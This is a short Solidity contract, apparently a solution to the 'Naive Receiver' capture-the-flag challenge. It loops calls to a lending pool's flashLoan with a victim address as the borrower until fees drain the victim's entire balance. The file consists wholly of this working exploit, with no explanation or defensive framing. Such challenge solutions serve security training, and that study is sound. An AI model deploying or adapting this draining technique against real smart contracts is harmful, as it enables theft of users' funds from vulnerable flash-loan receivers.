pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract DrainBalance {
    using Address for address payable;

    NaiveReceiverLenderPool private immutable pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function drainBalance(address target) external {
      while(target.balance > 0) {
        pool.flashLoan(target, 1);
      }
    }
}